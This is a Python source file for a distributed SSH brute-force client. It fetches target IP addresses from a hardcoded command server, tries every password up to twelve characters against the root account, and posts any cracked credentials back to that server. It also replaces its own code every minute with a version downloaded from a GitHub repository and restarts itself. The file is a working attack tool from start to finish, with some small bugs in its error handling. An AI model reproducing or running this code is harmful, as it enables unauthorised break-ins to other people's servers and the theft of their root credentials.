import itertools
import time
import json
import paramiko
import requests
import base64
import threading
import subprocess
import sys
import logging
import os

# Logging setup
logging.basicConfig(filename='client.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

# Hardcoded settings
USERS = ["root"]
MAX_PASSWORD_LENGTH = 12
GITHUB_REPO_URL = "https://api.github.com/repos/botsarefuture/ukrainetowin/contents/client.py"
API_BASE_URL = "http://65.108.222.76:5000"
TIMEOUT = 4


# Function to fetch updates from GitHub if available
def update_script_from_github():
    try:
        response = requests.get(GITHUB_REPO_URL)
        response.raise_for_status()
        remote_content = response.json()["content"]
        remote_content = base64.b64decode(remote_content).decode("utf-8")

        with open(__file__, "r") as f:
            local_content = f.read()

        if remote_content != local_content:
            with open(__file__, "w") as f:
                f.write(remote_content)
            logging.info(json.dumps(
                {"message": "Updated the script from GitHub"}))

            # Restart the script with the updated version
            args = [sys.executable] + sys.argv
            subprocess.Popen(args, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)
            sys.exit()
    except Exception as e:
        logging.error(json.dumps(
            {"error": "Error fetching updates from GitHub", "exception": str(e)}))


def send_result_to_server(target_ip, success, username="", password=""):
    url = API_BASE_URL + "/result"
    data = {"target_ip": target_ip, "success": success,
            "username": username, "password": password}
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, json=data, headers=headers)
    return response


def send_error_to_server(target_ip, username, guess, error):
    url = API_BASE_URL + "/error"
    data = {"target_ip": target_ip, "username": username,
            "guess": guess, "error": error}
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, json=data, headers=headers)
    return response


def send_timeout_to_server(target_ip):
    url = API_BASE_URL + "/timeout"
    data = {"target_ip": target_ip}
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, json=data, headers=headers)
    return response


def send_ban_to_server(target_ip):
    url = API_BASE_URL + "/ban"
    data = {"target_ip": target_ip}
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, json=data, headers=headers)
    return response


def brute_force_password(server_ip):
    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?'

    for length in range(1, MAX_PASSWORD_LENGTH + 1):
        for combination in itertools.product(alphabet, repeat=length):
            guess = ''.join(combination)
            logging.info(json.dumps({"ip": server_ip, "guess": guess}))
            result = brute(server_ip, guess)
            if result == 0:
                return

            if result == 1:
                continue

            if result == 6:
                return


def ssh_login(server_ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Disable key-based authentication
    client.load_system_host_keys()  # This clears any loaded keys from known_hosts
    # Ignore key validation warnings
    client.set_missing_host_key_policy(paramiko.WarningPolicy())

    try:
        client.connect(server_ip, username=username, password=password,
                       timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
        client.close()
        return 1  # SSH login succeeded
    except paramiko.BadAuthenticationType as e:
        print({"ip": server_ip, "username": username,
              "guess": password, "error": str(e)})
        send_error_to_server(server_ip, username, password, str(e))
        if "Invalid user" in str(e):
            return 5  # User doesn't exist
        if "Bad authentication type; allowed types: ['publickey']" in str(e):
            return 2  # Password authentication isn't supported.
        else:
            return 0  # Other BadAuthenticationType exception occurred
    except paramiko.AuthenticationException:
        send_error_to_server(server_ip, username, password, str(e))

        return 3  # Wrong password
    except paramiko.SSHException as e:
        send_error_to_server(server_ip, username, password, str(e))

        print({"ip": server_ip, "username": username,
              "guess": password, "error": str(e)})
        if "not open" in str(e):
            return 2  # Server doesn't support password login
        elif "Error reading SSH protocol banner" in str(e):
            return 4  # Connection error, potentially banned
        elif "timed out" in str(e):
            return 6  # Connection timed out

        elif "Unable to connect to port 22" in str(e):
            send_ban_to_server(server_ip)
            return 4  # Probably banned

        else:
            return 0  # Other SSHException occurred

    except Exception as e:
        send_error_to_server(server_ip, username, password, str(e))

        print({"ip": server_ip, "username": username,
              "guess": password, "error": str(e)})

        if "timed out" in str(e):
            return 6  # Connection timed out

        elif "Unable to connect to port 22" in str(e):
            send_ban_to_server(server_ip)
            return 4

        return 0  # Other exceptions occurred


def brute(server_ip, guess, times=0):
    result = ssh_login(server_ip, USERS[times], guess)

    if result == 1:
        creds = {"password": guess, "username": USERS[times]}
        send_result_to_server(server_ip, True, USERS[times], guess)
        return 0

    if result == 2:
        if times == 2:
            send_result_to_server(server_ip, False)
            return 0
        else:
            times += 1
            return brute(server_ip, guess, times)

    if result == 4:
        return 0

    if result == 6:
        send_timeout_to_server(server_ip)
        return 0


def get_target_from_server():
    url = "http://65.108.222.76:5000/target"
    response = requests.get(url)
    data = response.json()
    return data.get("target_ip")


def update_check_thread():
    while True:
        update_script_from_github()
        time.sleep(60)  # Check for updates every 5 minutes


def run_client_forever():
    while True:
        try:
            while True:
                target_ip = get_target_from_server()
                if target_ip:
                    brute_force_password(target_ip)
                    LATEST_IP = target_ip
                else:
                    print("No more targets.")
                    break

        except Exception as e:
            logging.error(json.dumps(
                {"error": "Error occurred", "exception": str(e)}))
            # Wait for a few seconds before restarting
            time.sleep(5)


if __name__ == "__main__":
    # Start the update check thread in the background
    update_thread = threading.Thread(target=update_check_thread)
    update_thread.daemon = True
    update_thread.start()

    # Run the client forever with auto-restart on crash
    run_client_forever()
